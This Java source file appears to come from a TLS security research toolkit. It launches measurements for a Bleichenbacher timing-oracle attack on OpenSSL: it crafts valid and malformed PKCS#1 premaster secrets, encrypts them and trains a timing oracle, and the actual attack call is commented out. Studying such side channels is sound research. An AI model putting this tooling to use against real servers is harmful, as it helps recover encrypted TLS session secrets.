package de.rub.nds.ssl.attacker;

import de.rub.nds.ssl.attacker.bleichenbacher.Bleichenbacher;
import de.rub.nds.ssl.attacker.bleichenbacher.OracleType;
import de.rub.nds.ssl.attacker.bleichenbacher.oracles.CommandLineTimingOracle;
import de.rub.nds.ssl.attacker.misc.Utility;
import java.io.FileInputStream;
import java.io.IOException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.Security;
import java.security.cert.CertificateException;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.Properties;
import javax.crypto.Cipher;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

/**
 * Measurement launcher.
 *
 * @author Christopher Meyer - christopher.meyer@rub.de
 * @version 0.1
 *
 * Jun 28, 2013
 */
public final class LauncherOpenSSL {

    /**
     * VALID PKCS with valid PMS - 1024bit.
     
    private static final byte[] PLAIN_VALID_PKCS_CASE_1 = new byte[]{
        (byte) 0x00, (byte) 0x02,
        (byte) 0x01, (byte) 0x01, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe,
        (byte) 0x00, 
        (byte) 0x03, (byte) 0x02, // TLS 1.2 = 03 03, TLS 1.1 = 03 02, TLS 1.0 = 03 01
        (byte) 0x01, (byte) 0x02, (byte) 0x03, (byte) 0x04, (byte) 0x05,
        (byte) 0x06, (byte) 0x07, (byte) 0x08, (byte) 0x09, (byte) 0x0a,
        (byte) 0x0b, (byte) 0x0c, (byte) 0x0d, (byte) 0x0e, (byte) 0x0f,
        (byte) 0x10, (byte) 0x11, (byte) 0x12, (byte) 0x13, (byte) 0x14,
        (byte) 0x15, (byte) 0x16, (byte) 0x17, (byte) 0x18, (byte) 0x19,
        (byte) 0x1a, (byte) 0x1b, (byte) 0x1c, (byte) 0x1d, (byte) 0x1e,
        (byte) 0x1f, (byte) 0x20, (byte) 0x21, (byte) 0x22, (byte) 0x23,
        (byte) 0x24, (byte) 0x25, (byte) 0x26, (byte) 0x27, (byte) 0x28,
        (byte) 0x29, (byte) 0x2a, (byte) 0x2b, (byte) 0x2c, (byte) 0x2d,
        (byte) 0x2e
    };*/
    
        private static final byte[] PLAIN_VALID_PKCS_CASE_1 = new byte[]{
        (byte) 0, (byte) 2, 
        (byte) 113, (byte) 89, (byte) -75, (byte) 59, (byte) -45, 
        (byte) 27, (byte) -61, (byte) -9, (byte) -21, (byte) 27, (byte) -1, 
        (byte) -5, (byte) 121, (byte) 93, (byte) -51, (byte) -43, (byte) 95, 
        (byte) 37, (byte) -7, (byte) 75, (byte) -109, (byte) 97, (byte) -29, 
        (byte) -53, (byte) -29, (byte) 105, (byte) -13, (byte) -9, (byte) 37, 
        (byte) 39, (byte) 87, (byte) -73, (byte) 113, (byte) -105, (byte) -21, 
        (byte) -29, (byte) 125, (byte) 11, (byte) -123, (byte) 15, (byte) 61, 
        (byte) -93, (byte) -87, (byte) 117, (byte) 111, (byte) 109, (byte) 111,
        (byte) 89, (byte) 79, (byte) 49, (byte) 9, (byte) 47, (byte) 51,
        (byte) -47, (byte) -33, (byte) 63, (byte) 91, (byte) 117, (byte) 49, 
        (byte) -23, (byte) -73, (byte) -51, (byte) -31, (byte) -71, (byte) 51, 
        (byte) -59, (byte) 59, (byte) -41, (byte) -11, (byte) -65, (byte) 7, 
        (byte) 61, (byte) 73, (byte) 65, (byte) -69, (byte) -73, (byte) -121, 
        (byte) 0, (byte) 3, (byte) 1, 
        (byte) -127, (byte) -85, (byte) -25, 
        (byte) 13, (byte) -57, (byte) -89, (byte) -91, (byte) 89, (byte) 15, 
        (byte) -89, (byte) 109, (byte) -83, (byte) 15, (byte) -87, (byte) 37, 
        (byte) -105, (byte) -65, (byte) -123, (byte) 71, (byte) 11, (byte) -51,
        (byte) -101, (byte) 33, (byte) 27, (byte) 29, (byte) 123, (byte) -19,
        (byte) -41, (byte) -15, (byte) 29, (byte) 23, (byte) 103, (byte) 79, 
        (byte) 7, (byte) -109, (byte) 77, (byte) -115, (byte) -19, (byte) 57, 
        (byte) 109, (byte) 51, (byte) 21, (byte) 29, (byte) 111, (byte) -11, 
        (byte) -109};

    /**
     * Static only ;-).
     */
    private LauncherOpenSSL() {
    }

    /**
     * Load a key store.
     *
     * @param keyStorePath Path to the key store.
     * @param keyStorePassword Password for key store.
     * @return Pre-loaded key store.
     * @throws KeyStoreException
     * @throws IOException
     * @throws NoSuchAlgorithmException
     * @throws CertificateException
     */
    private static KeyStore loadKeyStore(final String keyStorePath,
            final char[] keyStorePassword) throws KeyStoreException,
            IOException, NoSuchAlgorithmException, CertificateException {
        KeyStore ks = KeyStore.getInstance("JKS");
        ks.load(new FileInputStream(keyStorePath), keyStorePassword);

        return ks;
    }

    /**
     * Main entry point.
     *
     * @param args Arguments will be ignored
     * @throws Exception
     */
    public static void main(final String[] args) throws Exception {
        Properties properties = new Properties();
        if (args == null || args.length == 0) {
            properties.load(new FileInputStream("/opt/timing.properties"));
        } else {
            properties.load(new FileInputStream(args[0]));
        }

        // pre setup
        Security.addProvider(new BouncyCastleProvider());

        String keyName = properties.getProperty("keyName");
        char[] keyPassword = properties.getProperty("password").toCharArray();
        KeyStore keyStore = loadKeyStore(properties.getProperty("keyStorePath"),
                keyPassword);

        RSAPrivateKey privateKey =
                (RSAPrivateKey) keyStore.getKey(keyName, keyPassword);
        keyStore.getCertificate(keyName).getPublicKey();
        RSAPublicKey publicKey =
                (RSAPublicKey) keyStore.getCertificate(keyName).getPublicKey();

            Cipher cipher = Cipher.getInstance("RSA/None/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);

        // encrypt valid PMS
        byte[] encValidPMS = cipher.doFinal(PLAIN_VALID_PKCS_CASE_1);

        //  encrypt invalid PMS
        byte[] plainValidPKCS_Case_2 = PLAIN_VALID_PKCS_CASE_1.clone();
        plainValidPKCS_Case_2[12] = 0x0;
        plainValidPKCS_Case_2[plainValidPKCS_Case_2.length-49] = 0x5;
        System.out.println(Utility.bytesToHex(plainValidPKCS_Case_2));
        byte encCase2[] = cipher.doFinal(plainValidPKCS_Case_2);
        
        //  encrypt invalid PMS
        byte[] plainInvalidPKCS_Case_3 = PLAIN_VALID_PKCS_CASE_1.clone();
        plainInvalidPKCS_Case_3[1] = 0x8;
        byte[] encInvalidPMS = cipher.doFinal(plainInvalidPKCS_Case_3);

        // prepare the timing oracle
        CommandLineTimingOracle oracle = new CommandLineTimingOracle(
                OracleType.FFT, publicKey, privateKey, 
                properties.getProperty("command"));

        // setup PMSs
        oracle.setCase1PMS(encValidPMS);
        oracle.setCase2PMS(encCase2);
        oracle.setCase3PMS(encInvalidPMS);
        // Warmup SSL caches
        oracle.warmup();

        // train oracle
        oracle.trainOracle();

        // launch the attack
        // Bleichenbacher attack = new Bleichenbacher(encValidPMS.clone(), oracle,
        //        true);
        // attack.attack();
    }
}
